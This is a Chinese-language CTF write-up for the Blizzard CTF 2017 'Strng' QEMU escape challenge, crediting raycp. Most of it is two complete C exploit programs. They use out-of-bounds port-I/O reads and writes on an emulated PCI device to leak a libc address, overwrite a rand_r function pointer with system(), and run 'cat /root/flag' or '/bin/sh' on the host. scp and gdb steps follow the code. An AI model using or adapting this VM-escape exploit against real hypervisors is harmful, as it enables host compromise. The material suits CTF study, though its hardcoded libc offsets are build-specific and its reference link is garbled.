
```
/*
Author: raycp
File: exp.c
Description: exp for BlizzardCTF2017-Strng, out-of-bound access with pmio
Date: 2019-08-04
*/
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>
unsigned char* mmio_mem;
uint32_t pmio_base=0xc050;
void die(const char* msg)
{
perror(msg);
exit(-1);
}
void mmio_write(uint32_t addr, uint32_t value)
{
*((uint32_t*)(mmio_mem + addr)) = value;
}
uint32_t mmio_read(uint32_t addr)
{
return *((uint32_t*)(mmio_mem + addr));
}
uint32_t pmio_write(uint32_t addr, uint32_t value)
{
outl(value,addr);
}
uint32_t pmio_read(uint32_t addr)
{
return (uint32_t)inl(addr);
}
uint32_t pmio_arbread(uint32_t offset)
{
pmio_write(pmio_base+0,offset);
return pmio_read(pmio_base+4);
}
void pmio_abwrite(uint32_t offset, uint32_t value)
{
pmio_write(pmio_base+0,offset);
pmio_write(pmio_base+4,value);
}
int main(int argc, char *argv[])
{
// Open and map I/O memory for the strng device
int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
if (mmio_fd == -1)
die("mmio_fd open failed");
mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
if (mmio_mem == MAP_FAILED)
die("mmap mmio_mem failed");
printf("mmio_mem @ %p\n", mmio_mem);
// Open and map I/O memory for the strng device
if (iopl(3) !=0 )
die("I/O permission is not enough");
// leaking libc address
//result = opaque->regs[reg_addr >> 2]; 0x108>>2=0x42
/*
gdb-peda$ x/xi 0x7ffff65268d0
0x7ffff65268d0 <__srandom>: sub rsp,0x8
gdb-peda$ x/xw $rdi+0x41*4+0xaf4
0x555557e224a8: 0xf65268d0
gdb-peda$ x/xw $rdi+0x42*4+0xaf4
0x555557e224ac: 0x00007fff
*/
//puts("leak srandom\n");
//getchar();
uint64_t srandom_addr=pmio_arbread(0x108); //0x7fff
srandom_addr=srandom_addr<<32;
srandom_addr+=pmio_arbread(0x104);
printf("leaking srandom addr: 0x%llx\n",srandom_addr);
/*
gdb-peda$ vmmap libc
Start End Perm Name
0x00007ffff64ec000 0x00007ffff66ac000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so
gdb-peda$ p/x 0x7ffff65268d0-0x00007ffff64ec000
$8 = 0x3a8d0
gdb-peda$ x/i system
0x7ffff6531390 <__libc_system>: test rdi,rdi
gdb-peda$ p/x 0x7ffff6531390-0x00007ffff64ec000
$9 = 0x45390
*/
uint64_t libc_base= srandom_addr-0x00043cd0;//0x3a8d0;
uint64_t system_addr= libc_base+0x0004f550;//0x45390;
printf("libc base: 0x%llx\n",libc_base);
printf("system addr: 0x%llx\n",system_addr);
// leaking heap address
/*
gdb-peda$ x/10xg 0x555557e218b0+0x1d4+0x18+0xaf4
0x555557e22590: 0x0000555557e225e0 0x0000555557e22600
0x555557e225a0: 0x0000000000000000 0x0000555555a5b5b0
0x555557e225b0: 0x0000555555a5b630 0x0000000000000000
0x555557e225c0: 0x0000555555a5b210 0x0000555557e22570
0x555557e225d0: 0x0000000000000000 0x0000000000000021
gdb-peda$ p/x 0x1d4+0x18
$2 = 0x1ec
gdb-peda$ vmmap heap
Start End Perm Name
0x000055555610a000 0x0000555558182000 rw-p [heap]
gdb-peda$ p/x 0x0000555557e225e0 -0x000055555610a000
$3 = 0x1d185e0
gdb-peda$ p/x 0x555557e218b0+0xaf4+0x8-0x000055555610a000
$4 = 0x1d183ac
*/
/*
uint64_t heap_addr=pmio_arbread(0x1f0);
heap_addr=heap_addr<<32;
heap_addr+=pmio_arbread(0x1ec);
printf("leaking heap addr: 0x%llx\n",heap_addr- 0x1d185e0);
uint64_t para_addr=heap_addr+0x1d183ac;
printf("parameter addr: 0x%llx\n",para_addr);
*/
// overwrite rand_r pointer to system
//Python>hex(0xc08-0xaf4)=0x114
pmio_abwrite(0x114,system_addr&0xffffffff);
//In [84]: enhex(b'cat /root/flag')
//Out[84]: '636174202f726f6f742f666c6167'
mmio_write(8,0x20746163);
mmio_write(12,0x6f6f722f);
mmio_write(16,0x6c662f74);
mmio_write(20,0x6761);
puts("see cat flag\n b *strng_mmio_write\n"); //这里可以看提前放好的参数cat /root/flag
getchar();
mmio_write(0xc,0);
}
```

### 第二种 exp

```
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/io.h>
#include <assert.h>
#define LOG(...) printf(__VA_ARGS__)
void die(const char* msg) {
perror(msg);
_exit(-1);
}
void hexdump(uint8_t *mem, size_t len) {
for (size_t i = 1; i <= len; i++) {
printf("%02x ", mem[i-1]);
if (i % 16 == 0)
printf("\n");
else if (i % 8 == 0)
printf(" ");
}
}
#define STRNG_MMIO_BASE 0xfebf1000
#define STRNG_MMIO_SIZE 0x100
#define STRNG_PMIO_BASE 0x000000000000c050
#define STRNG_PMIO_SIZE 0x8
uint64_t strng_mmio_map = 0x0;
uint32_t readm32(uint64_t addr) {
return *(uint32_t *)addr;
}
void writem32(uint64_t addr, uint32_t val) {
*(uint32_t *)addr = val;
}
uint32_t strng_mmio_read(uint64_t addr) {
assert(!(addr&3));
uint32_t val = readm32(strng_mmio_map+addr);
return val;
}
void strng_mmio_write(uint64_t addr, uint32_t val) {
assert(!(addr&3));
writem32(strng_mmio_map+addr, val);
}
uint32_t strng_pmio_read(uint64_t addr) {
assert(addr == 4 || addr == 0);
return inl(STRNG_PMIO_BASE+addr);
}
void strng_pmio_write(uint64_t addr, uint32_t val) {
assert(addr == 4 || addr == 0);
outl(val, STRNG_PMIO_BASE+addr);
}
int main(int argc, char const* argv[]) {
int devmem_fd;
if (0 != iopl(3)) {
die("iopl");
}
devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
if (devmem_fd < 0) {
die("open /dev/mem");
}
strng_mmio_map = (uint64_t)mmap((void *)0, STRNG_MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, STRNG_MMIO_BASE);
if (!strng_mmio_map) {
die("mmap mmio");
}
close(devmem_fd);
#if 0
strng_mmio_write(0x40, 0xdeadbeef);
uint32_t val = strng_mmio_read(0x40);
printf("0x%016x", val);
#endif
// /bin/sh
strng_pmio_write(0, 0x8);
strng_pmio_write(4, 0x41414141); // junk
strng_pmio_write(0, 0xc);
strng_pmio_write(4, 0x41414141); // junk
strng_pmio_write(0, 0x10);
strng_pmio_write(4, 0x69622f3b); // ';/bin/sh'
strng_pmio_write(0, 0x14);
strng_pmio_write(4, 0x68732f6e); // ';/bin/sh'
// leak
strng_pmio_write(0, 0x108);
uint64_t libc_srand = strng_pmio_read(4);
libc_srand = (libc_srand << 32);
strng_pmio_write(0, 0x104);
libc_srand += strng_pmio_read(4);
printf("libc_srand 0x%016llx\n", libc_srand);
uint64_t libc_base = libc_srand - 0x00043cd0;//0x3a820;
uint64_t libc_system = libc_base + 0x0004f550;//0x449c0;
// rewrite with system
strng_pmio_write(0, 0x114);
strng_pmio_write(4, libc_system&0xffffffff);
strng_pmio_write(0, 0x118);
strng_pmio_write(4, libc_system>>32);
getchar();
// invoke system
strng_pmio_write(0, 0xc);
strng_pmio_write(4, 0);
return 0;
}
```

然后 host 使用命令 `scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu` 将 `exp` 拷贝到虚拟机中。

若要调试 qemu 以查看相应的流程，host 机器可以使用 `ps -ax|grep qemu` 找到相应的进程；再 ``sudo gdb ./qemu-system-x86_64 -p `pidof qemu-system-x86_64` `` 上去，然后在里面下断点查看想观察的数据，示例如下：

发现经常会因为 stop signal 断下，所以加上 `handle SIGSTOP nostop`。

断点如下：

```
b strng_pmio_write
b strng_pmio_read
b strng_mmio_write
b strng_pmio_read
```

然后在虚拟机中执行 `sudo ./exp` 执行 `exp`，就可以愉快的调试了。

# 1. 描述

调试过程参考链接`63cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5j5i4W2Q4x3X3c8U0M7q4)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3j5i4u0U0K9r3W2$3k6i4u0K6i4K6u0r3M7h3g2E0N6g2)9J5k6s2m8%4L8W2)9J5k6p5u0D9K9i4A6*7j5i4u0V1i4K6u0V1b7#2c8r3i4K6u0V1x3U0l9I4y4#2)9J5k6q4y4@1M7X3&6Y4i4K6u0V1N6%4u0A6N6r3g2#2M7l9.`.

感谢 raycp 大神

题目源码的链接为 Blizzard CTF 2017，是 qemu 逃逸题，flag 文件在宿主机中的路径为 `/root/flag`。
